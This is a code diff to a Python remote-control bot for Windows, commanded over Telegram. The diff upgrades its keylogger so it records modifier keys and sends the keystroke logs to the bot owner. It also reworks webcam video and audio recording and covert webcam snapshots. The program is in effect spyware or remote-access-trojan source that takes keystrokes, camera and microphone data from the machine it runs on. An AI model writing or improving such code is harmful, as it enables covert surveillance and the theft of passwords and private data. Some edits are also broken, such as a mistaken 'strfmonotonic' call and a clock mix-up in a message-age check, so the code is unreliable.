@@ -50,17 +50,17 @@ from io import BytesIO
 import pyautogui as pg
 import subprocess as sp
 from shutil import copy2
-from time import time, sleep
 from datetime import datetime
 from tempfile import gettempdir
 from typing import Any, Callable
+from time import monotonic, sleep
 from random import choice, randint
 from winotify import audio, Notification
 from webbrowser import open as browseropen
 from string import ascii_letters, printable
 from subprocess import CREATE_NO_WINDOW, PIPE, Popen
 from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, rename
-from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
+from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN, KEY_UP
 from os.path import join, abspath, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize
 
 
@@ -151,7 +151,7 @@ else:
     FACERECOGNITION = False
 
 def now() -> str:
-    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    return datetime.now().strfmonotonic("%Y-%m-%d %H:%M:%S")
 
 #GETTING TOKEN AND CHAT_ID
 def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
@@ -1041,40 +1041,111 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                     k = name
                 state["value"]+=k
 
-    def keylogger(self, timeout: int=10) -> None:
-        print(f"Starting keylogger for {timeout} seconds")
-        buffer = ""
-        start=time()
-        loading_bar = self.new_loading_bar(timeout, f"{emoji_dict["keyboard"]} Keylogger with file", showperc=True)
-        while (time()-start)<timeout:
-            loading_bar.update(time()-start)
-            if loading_bar.canceled:
-                loading_bar.fill_and_delete()
-                return
-            event = read_event()
-            if event.event_type == KEY_DOWN:
-                name = event.name
-                if len(name) != 1:
-                    if name == "space":
-                        k=" "
-                    elif name == "maiusc":
+    def keylogger(self, timeout: int = 10) -> None:
+        """
+        Captures keystrokes for `timeout` seconds.
+        Fully cancellable via the loading bar's cancel button.
+        No temporary files — result sent directly via in-memory BytesIO.
+        """
+        self.bsend(f"⌨️ Keylogger started — {timeout} seconds (cancel anytime)")
+
+        buffer = []
+        shift_pressed = False
+        caps_on = False
+        ctrl_pressed = False
+
+        loading = self.new_loading_bar(
+            total=timeout,
+            label="Keylogger",
+            showperc=True,
+            # autodelete=False  ← usually fine to let it stay visible after finish
+        )
+
+        start_time = monotonic()
+
+        try:
+            while monotonic() - start_time < timeout:
+                elapsed = monotonic() - start_time
+                loading.update(elapsed)
+
+                if loading.canceled:
+                    loading.fill_and_delete()
+                    self.bsend("🛑 Keylogger cancelled by user")
+                    return
+
+                # Blocking call — this is the main limitation
+                event = read_event(suppress=False)
+
+                if event.event_type == KEY_DOWN:
+                    name = event.name.lower()
+
+                    if name in ("left shift", "right shift"):
+                        shift_pressed = True
                         continue
-                    elif name == "backspace":
-                        buffer = buffer[:-1]
+                    if name in ("left ctrl", "right ctrl"):
+                        ctrl_pressed = True
+                        continue
+                    if name == "caps lock":
+                        caps_on = not caps_on
+                        continue
+
+                    char = None
+
+                    if len(name) == 1:
+                        char = name
+                        if shift_pressed != caps_on:
+                            char = char.upper()
+
+                    elif name == "space":
+                        char = " "
+                    elif name == "enter":
+                        char = "\n"
+                    elif name == "tab":
+                        char = "\t"
+                    elif name in ("backspace", "delete"):
+                        if buffer:
+                            buffer.pop()
                         continue
                     else:
-                        k=f" <{name.upper()}> "
-                else:
-                    k = name
-            buffer+=k
-        filename = randomname()
-        with open(filename, "w") as fo:
-            fo.write(buffer)
-        with open(filename, "r") as fi:
-            self.bot.sendDocument(self.owner_id, (f"keylog{now()}.txt",fi))
-        if isfile(filename):
-            remove(filename)
-        loading_bar.fill_and_delete()
+                        if name not in ("left", "right", "up", "down", "page up", "page down"):
+                            key = name.upper().replace(" ", "_")
+                            prefix = "CTRL+" if ctrl_pressed else ""
+                            buffer.append(f"[{prefix}{key}]")
+
+                    if char is not None:
+                        buffer.append(char)
+
+                elif event.event_type == KEY_UP:
+                    if event.name.lower() in ("left shift", "right shift"):
+                        shift_pressed = False
+                    if event.name.lower() in ("left ctrl", "right ctrl"):
+                        ctrl_pressed = False
+
+            loading.fill_and_delete()
+
+            if not buffer:
+                self.bsend("No keys were pressed during this period.")
+                return
+
+            content = "".join(buffer)
+            count = len(buffer)
+
+            file_obj = craft_file(
+                content=content,
+                filename=f"keylog_{datetime.now():%Y-%m-%d_%H%M%S}.txt"
+            )
+
+            self.bot.sendDocument(
+                self.owner_id,
+                document=file_obj,
+                caption=f"Keylogger finished • {count} events captured • {timeout}s"
+            )
+
+            self.bsend(f"Done — {count} characters/events captured.")
+
+        except Exception as e:
+            loading.fill_and_delete()
+            self.bsend(f"Keylogger error:\n```\n{str(e)}\n```", parse_mode="Markdown")
 
     def leftclick(self) -> None:
         print("Left mouse click")
@@ -1082,7 +1153,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def live_keylogger(self, timeout=10) -> None:
         print(f"Starting live keylogger for {timeout} seconds")
-        start = time()
+        start = monotonic()
         bar = self.new_loading_bar(timeout, label=f"📡 Live Keylogger")
         state = {"value":"📡 Live Keylogger Output: ",
                   "running":True}
@@ -1093,7 +1164,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             if bar.canceled:
                 bar.fill_and_delete()
                 return
-            elapsed = time()-start
+            elapsed = monotonic()-start
             bar.update(elapsed)
             buffer_message.edit(state["value"])
         state["running"]=False
@@ -1197,11 +1268,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def mouselock(self, timer: int=6) -> None:
         print(f"Locking mouse for {timer} seconds")
         bar = self.new_loading_bar(timer, label=f"{emoji_dict['mouse']} Mouselock")
-        start = time()
+        start = monotonic()
         pos = pg.position()
         time_elapsed = 0
         while timer > time_elapsed:
-            time_elapsed = time()-start
+            time_elapsed = monotonic()-start
             bar.update(time_elapsed)
             pg.moveTo(pos)
         bar.fill_and_delete()
@@ -1404,120 +1475,131 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         remove(new_filepath)
 
     def parse_command(self, text: str) -> None:
-        print(f"Parsing command: {text}")
-        args = text.split()
-        command = args[0]
+        try:
+            print(f"Parsing command: {text}")
+            args = text.split()
+            command = args[0]
 
-        if command.startswith("/"):
-            command = args[0][1:]
-        function_args = args[1:]
-        function_args = map(lambda x:x.replace("<SPACE>"," "), function_args)
-        function_args = list(map(lambda x: int(x) if x.isdigit() else x, function_args))
+            if command.startswith("/"):
+                command = args[0][1:]
+            function_args = args[1:]
+            function_args = map(lambda x:x.replace("<SPACE>"," "), function_args)
+            function_args = list(map(lambda x: int(x) if x.isdigit() else x, function_args))
 
-        func = self.function_table.get(command)
-        if func:
-            function_needed_args = get_required_params(func)
-            if function_needed_args:
-                if function_needed_args[0] == "self":
-                    function_needed_args=function_needed_args[1:]
-                
-            function_all_args = get_function_parameters(func)
-            if function_all_args:
-                if function_all_args[0] == "self":
-                    function_all_args=function_all_args[1:]
+            func = self.function_table.get(command)
+            if func:
+                function_needed_args = get_required_params(func)
+                if function_needed_args:
+                    if function_needed_args[0] == "self":
+                        function_needed_args=function_needed_args[1:]
+                    
+                function_all_args = get_function_parameters(func)
+                if function_all_args:
+                    if function_all_args[0] == "self":
+                        function_all_args=function_all_args[1:]
 
-            try:
-                if func in self.no_background_functions:
-                    func(*function_args)
-                else:
-                    skip_len = False
-                    if "*args" in function_all_args:
-                        skip_len = True
-                    if (len(function_args) < len(function_needed_args) or len(function_args) > len(function_all_args)) and not(skip_len):
-                        raise TypeError("Wrong number of arguments for this function")
-                    if function_args:
-                        thread_args = (*function_args,)
-                        new_thread = Thread(target=func, args=thread_args)
+                try:
+                    if func in self.no_background_functions:
+                        func(*function_args)
                     else:
-                        new_thread = Thread(target=func)
-                    new_thread.start()
-            except TypeError as e:
-                args = {} 
-                for arg in function_needed_args:
-                    if arg == "self":
-                        continue
-                    response = self.send_prompt(f"Choose a {arg} for {command}")
-                    response = response.replace(" ","<SPACE>")
-                    args[arg] = response
-                self.parse_command(f"/{command} " + " ".join(args.values()))
-            except Exception as e:
-                self.bsend(f"Unhandled error for function {command}\n{e}")
+                        skip_len = False
+                        if "*args" in function_all_args:
+                            skip_len = True
+                        if (len(function_args) < len(function_needed_args) or len(function_args) > len(function_all_args)) and not(skip_len):
+                            raise TypeError("Wrong number of arguments for this function")
+                        if function_args:
+                            thread_args = (*function_args,)
+                            new_thread = Thread(target=func, args=thread_args)
+                        else:
+                            new_thread = Thread(target=func)
+                        new_thread.start()
+                except TypeError as e:
+                    args = {} 
+                    for arg in function_needed_args:
+                        if arg == "self":
+                            continue
+                        response = self.send_prompt(f"Choose a {arg} for {command}")
+                        response = response.replace(" ","<SPACE>")
+                        args[arg] = response
+                    self.parse_command(f"/{command} " + " ".join(args.values()))
+                except Exception as e:
+                    self.bsend(
+                        f"Error parsing command '{text}'\n"
+                        f"```{traceback.format_exc(limit=4)}```",
+                        parse_mode="Markdown"
+                    )
 
-        elif command.startswith("PK"):
-            if command == "PK_next_page" and self.process_explorer_menu:
-                self.process_killer_page += 1
-                self.process_killer(page=self.process_killer_page)
-            elif command == "PK_previous_page" and self.process_explorer_menu:
-                self.process_killer_page -= 1
-                self.process_killer(page=self.process_killer_page)
-            elif command == "PK_close_page" and self.process_explorer_menu:
-                self.process_explorer_menu.delete()
-            elif command in ("PK_next_page", "PK_previous_page") and not self.process_explorer_menu:
-                self.bsend("Use /processkiller first")
+            elif command.startswith("PK"):
+                if command == "PK_next_page" and self.process_explorer_menu:
+                    self.process_killer_page += 1
+                    self.process_killer(page=self.process_killer_page)
+                elif command == "PK_previous_page" and self.process_explorer_menu:
+                    self.process_killer_page -= 1
+                    self.process_killer(page=self.process_killer_page)
+                elif command == "PK_close_page" and self.process_explorer_menu:
+                    self.process_explorer_menu.delete()
+                elif command in ("PK_next_page", "PK_previous_page") and not self.process_explorer_menu:
+                    self.bsend("Use /processkiller first")
 
-        elif command.startswith("DISPLAYSET"):
-            if command == "DISPLAYSET_close":
-                if self.display_mode_keyboard:
-                    self.display_mode_keyboard.delete()
-                    self.display_mode_keyboard = None
+            elif command.startswith("DISPLAYSET"):
+                if command == "DISPLAYSET_close":
+                    if self.display_mode_keyboard:
+                        self.display_mode_keyboard.delete()
+                        self.display_mode_keyboard = None
 
-        elif command.startswith("MOUSE"):
-            if command == "MOUSE_closemenu":
-                if self.mouse_controller_menu:
-                    self.mouse_controller_menu.delete()
-                    self.mouse_controller_menu = None
+            elif command.startswith("MOUSE"):
+                if command == "MOUSE_closemenu":
+                    if self.mouse_controller_menu:
+                        self.mouse_controller_menu.delete()
+                        self.mouse_controller_menu = None
 
-        elif command.startswith("MXR"):
-            if command == "MXR_close":
-                if self.mixer_menu_keyboard:
-                    self.mixer_menu_keyboard.delete()
-                    self.mixer_menu_keyboard = None
+            elif command.startswith("MXR"):
+                if command == "MXR_close":
+                    if self.mixer_menu_keyboard:
+                        self.mixer_menu_keyboard.delete()
+                        self.mixer_menu_keyboard = None
 
-        elif command.startswith("PROCMON"):
-            if self.processmonitormenu:
-                if command == "PROCMON_close":
-                    self.processmonitormenu.delete()
-                    self.processmonitormenu = None
-                elif command.startswith("PROCMON_procmonrem"):
-                    process = function_args[0]
-                    self.processmonitorrem(process)
-                    self.processmonitormenu.delete()
-                    self.processmonitormenushow()
+            elif command.startswith("PROCMON"):
+                if self.processmonitormenu:
+                    if command == "PROCMON_close":
+                        self.processmonitormenu.delete()
+                        self.processmonitormenu = None
+                    elif command.startswith("PROCMON_procmonrem"):
+                        process = function_args[0]
+                        self.processmonitorrem(process)
+                        self.processmonitormenu.delete()
+                        self.processmonitormenushow()
 
-        elif command.startswith("CANTOP"):
-            if command == "CANTOP_close":
-                self.cantopenmenu_ref.delete()
-                self.cantopenmenu_ref = None
+            elif command.startswith("CANTOP"):
+                if command == "CANTOP_close":
+                    self.cantopenmenu_ref.delete()
+                    self.cantopenmenu_ref = None
 
-        elif command.startswith("mainmenu"):
-            if self.mainmenu_ref:
-                if command == "mainmenu_close":
-                    self.mainmenu_ref.delete()
-                    self.mainmenu_ref = None
-                elif command == "mainmenu_next":
-                    self.mainmenu_ref.delete()
-                    self.mainmenu_ref.send_next_page()
-                elif command == "mainmenu_prev":
-                    self.mainmenu_ref.delete()
-                    self.mainmenu_ref.send_previous_page()
+            elif command.startswith("mainmenu"):
+                if self.mainmenu_ref:
+                    if command == "mainmenu_close":
+                        self.mainmenu_ref.delete()
+                        self.mainmenu_ref = None
+                    elif command == "mainmenu_next":
+                        self.mainmenu_ref.delete()
+                        self.mainmenu_ref.send_next_page()
+                    elif command == "mainmenu_prev":
+                        self.mainmenu_ref.delete()
+                        self.mainmenu_ref.send_previous_page()
 
-        elif command.startswith("cancel_loading"):
-            bar_id = int(command.split(":")[1])
-            if bar_id in self.bars:
-                self.bars[bar_id].canceled = True
-                del self.bars[bar_id]
-        else:
-            self.bsend(f"Invalid command {command}")
+            elif command.startswith("cancel_loading"):
+                bar_id = int(command.split(":")[1])
+                if bar_id in self.bars:
+                    self.bars[bar_id].canceled = True
+                    del self.bars[bar_id]
+            else:
+                self.bsend(f"Invalid command {command}")
+        except Exception as e:
+            self.bsend(
+                f"Error parsing command '{text}'\n"
+                f"```{traceback.format_exc(limit=4)}```",
+                parse_mode="Markdown"
+            )
     
     def parse_video_note(self, saved_filepath: str) -> None:
         print(f"Parsing video note: {saved_filepath}")
@@ -1532,8 +1614,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             duration = document["duration"]
             video_stream = VideoCapture(saved_filepath)
             res = True
-            start=time()
-            while res and (time()-start)<=duration:
+            start=monotonic()
+            while res and (monotonic()-start)<=duration:
                 res, frame = video_stream.read()
                 imwrite("tmp.png", frame)
                 change_wallpaper(abspath("tmp.png"))
@@ -1616,7 +1698,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print(f"Parsing text message: {msg['text'][:50]}...")
         text = msg["text"]
         date = int(msg["date"])
-        if (date+self.message_timeout)<time():
+        if (date+self.message_timeout)<monotonic():
             return
         if self.user["status"] is None:
             if text == "/start":
@@ -1701,12 +1783,12 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def playrandomnoise(self, duration: int) -> None:
         print(f"Playing random noise for {duration} seconds")
-        start = time()
+        start = monotonic()
         loading_bar = self.new_loading_bar(duration, label="Play Random Noise")
         thread = Thread(target=play_random_noise, args=(duration,))
         thread.start()
-        while (time()-start) < duration:
-            elapsed = int(time()-start)
+        while (monotonic()-start) < duration:
+            elapsed = int(monotonic()-start)
             loading_bar.update(elapsed)
             if loading_bar.canceled:
                 break
@@ -1742,10 +1824,10 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def randomkeyboard(self, timeout: int =5) -> None:
         print(f"Random keyboard input for {timeout} seconds")
-        start = time()
+        start = monotonic()
         loading_bar = self.new_loading_bar(timeout, label=f"{emoji_dict['keyboard']} Random Keyboard", showperc=True)
-        while (time()-start)<timeout:
-            loading_bar.update(time()-start)
+        while (monotonic()-start)<timeout:
+            loading_bar.update(monotonic()-start)
             if loading_bar.canceled:
                 loading_bar.fill_and_delete()
                 return
@@ -1795,7 +1877,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             SCREEN_SIZE = tuple(pg.size())
             fourcc = VideoWriter_fourcc(*'XVID')
             out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
-            start_time = time()
+            start_time = monotonic()
             samplerate = 44100
             channels = 1
             frames = int(duration * samplerate)
@@ -1806,7 +1888,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 if bar.canceled:
                     bar.fill_and_delete()
                     return
-                time_elapsed = time() - start_time
+                time_elapsed = monotonic() - start_time
                 bar.progress = time_elapsed
                 bar.update()
                 img = pg.screenshot()
@@ -1835,57 +1917,67 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend(f"Error while recording screen: {e}")
         bar.fill_and_delete()
 
-    def record_webcam(self, duration: int=10, caption: str|None=None) -> None:
-        print(f"Recording webcam for {duration} seconds")
-        duration = int(duration)
-        bar = self.new_loading_bar(duration, label=f"{emoji_dict['photo']} Recording Webcam")
+    def record_webcam(self, duration: int = 10, caption: str | None = None) -> None:
         try:
-            filename = join(f"{BURN_DIRECTORY}", f"{randomname()}.mp4")
-            audio_filename = join(f"{BURN_DIRECTORY}",f"{randomname()}.wav")
-            fourcc = VideoWriter_fourcc(*'XVID')
+            duration = int(duration)
+            bar = self.new_loading_bar(duration, label="Recording Webcam", showperc=True)
+
+            filename = join(BURN_DIRECTORY, f"{randomname()}.mp4")
+            audio_file = join(BURN_DIRECTORY, f"{randomname()}.wav")
+
+            fourcc = VideoWriter_fourcc(*"XVID")
             self.opencap()
-            webcam = self.cap
-            width = int(webcam.get(CAP_PROP_FRAME_WIDTH))
-            height = int(webcam.get(CAP_PROP_FRAME_HEIGHT))
-            out = VideoWriter(filename, fourcc, 20.0, (width, height))
-            start_time = time()
-            samplerate = 44100
-            channels = 1
-            frames = int(duration * samplerate)
-            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
-            time_elapsed = 0
-            while int(time_elapsed) < duration:
+            w = int(self.cap.get(CAP_PROP_FRAME_WIDTH))
+            h = int(self.cap.get(CAP_PROP_FRAME_HEIGHT))
+            out = VideoWriter(filename, fourcc, 20.0, (w, h))
+
+            start = monotonic()
+            audio_data = sd.rec(int(duration * 44100), samplerate=44100, channels=1, dtype="int16")
+
+            while monotonic() - start < duration:
                 if bar.canceled:
                     bar.fill_and_delete()
+                    out.release()
+                    self.closecap()
                     return
-                time_elapsed = time() - start_time
-                bar.progress = time_elapsed
-                bar.update()
-                ret, frame = webcam.read()
-                if not ret:
-                    break
-                out.write(frame)
-            bar.set100()
+
+                bar.update(monotonic() - start)
+                ret, frame = self.cap.read()
+                if ret:
+                    out.write(frame)
+                sleep(0.001)
+
+            bar.fill_and_delete()
             sd.wait()
             out.release()
             self.closecap()
-            sf.write(audio_filename, audio_data, samplerate)
-            video_clip = VideoFileClip(filename)
-            audio_clip = AudioFileClip(audio_filename)
-            video_with_audio = video_clip.set_audio(audio_clip)
-            final_filename = filename.replace(".mp4", "_final.mp4")
-            video_with_audio.write_videofile(final_filename, logger=None)
-            tmploadingmessage = self.new_editable_message("Sending recording...", True)
-            with open(final_filename, "rb") as video:
-                response = self.bot.sendVideo(self.owner_id, video, caption=caption)
-                self.all_session_messages.append(response["message_id"])
-            tmploadingmessage.delete()
-            remove(filename)
-            remove(audio_filename)
-            remove(final_filename)
+
+            sf.write(audio_file, audio_data, 44100)
+
+            # merge audio+video (your existing moviepy logic)
+            video = VideoFileClip(filename)
+            audio = AudioFileClip(audio_file)
+            final = video.set_audio(audio)
+            final_file = filename.replace(".mp4", "_final.mp4")
+            final.write_videofile(final_file, logger=None, verbose=False)
+
+            tmpload = self.new_editable_message("Uploading recording...")
+            with open(final_file, "rb") as vid:
+                resp = self.bot.sendVideo(self.owner_id, vid, caption=caption)
+                self.all_session_messages.append(resp["message_id"])
+            tmpload.delete()
+
+            for f in (filename, audio_file, final_file):
+                if exists(f):
+                    remove(f)
+
         except Exception as e:
-            self.bsend(f"Error while recording webcam {e}")
-        bar.fill_and_delete()
+            self.bsend(
+                f"Error during webcam recording\n```{str(e)}```",
+                parse_mode="Markdown"
+            )
+            if "bar" in locals():
+                bar.fill_and_delete()
 
     # This code is like an impressive skycraper held by a little wire.
 
@@ -1901,7 +1993,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
             self.opencap()
             webcam = self.cap
-            start_time = time()
+            start_time = monotonic()
             samplerate = 44100
             channels = 1
             frames = int(capture_duration * samplerate)
@@ -1912,7 +2004,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 if bar.canceled:
                     bar.fill_and_delete()
                     return
-                time_elapsed = time() - start_time
+                time_elapsed = monotonic() - start_time
                 bar.progress = time_elapsed
                 bar.update()
                 img = pg.screenshot()
@@ -1993,23 +2085,33 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 ...
         self.closecap()
 
-    def selfie(self, caption: str|None=None, reply_markup=None) -> None:
-        print("Taking selfie")
+    def selfie(self, caption: str | None = None, reply_markup=None) -> bool:
         try:
-            filename = join(BURN_DIRECTORY,randompngname())
+            filename = join(BURN_DIRECTORY, randompngname())
             self.opencap()
-            camera = self.cap
-            return_value, image = camera.read()
-            if not return_value:
-                raise Exception("Could not find camera")
-            imwrite(filename, image)
-            response = self.bot.sendPhoto(self.owner_id, open(filename, "rb"), caption=caption, reply_markup=reply_markup)
-            self.all_session_messages.append(response["message_id"])
+            ret, frame = self.cap.read()
+            if not ret:
+                raise RuntimeError("Webcam read failed")
+
+            imwrite(filename, frame)
+            with open(filename, "rb") as f:
+                resp = self.bot.sendPhoto(
+                    self.owner_id,
+                    f,
+                    caption=caption,
+                    reply_markup=reply_markup
+                )
+                self.all_session_messages.append(resp["message_id"])
+
             remove(filename)
             self.closecap()
             return True
+
         except Exception as e:
-            self.bsend(f"Something has happened while getting webcam\n {e}")
+            self.bsend(
+                f"Error while taking selfie\n```{str(e)}```",
+                parse_mode="Markdown"
+            )
             return False
 
     def send_record_audio(self, seconds: int=5, caption: str|None=None) -> None:
@@ -2050,13 +2152,13 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         seconds = int(seconds)
         loading_bar = self.new_loading_bar(label=f"{emoji_dict['camera']}{emoji_dict['screen']} Set Camera As Wallpaper", total=seconds, showperc=True)
         filename = join(BURN_DIRECTORY, "jxframe.png")
-        start = time()
+        start = monotonic()
         res = True
         self.opencap()
-        while time()-start <= seconds and res:
+        while monotonic()-start <= seconds and res:
             if loading_bar.canceled:
                 break
-            loading_bar.update(time()-start)
+            loading_bar.update(monotonic()-start)
             res, frame = self.cap.read()
             frame = pad_to_16_9(frame)
             imwrite(filename, frame)
@@ -2377,10 +2479,10 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def waitforface(self, timeout=60):
         print(f"Waiting for face for {timeout} seconds")
-        start = time()
+        start = monotonic()
         self.opencap()
         cap = self.cap
-        while time()-start < timeout:
+        while monotonic()-start < timeout:
             res, frame = detect_face(cap)
             if frame is None:
                 self.bsend("Face recognition model not loaded properly.")
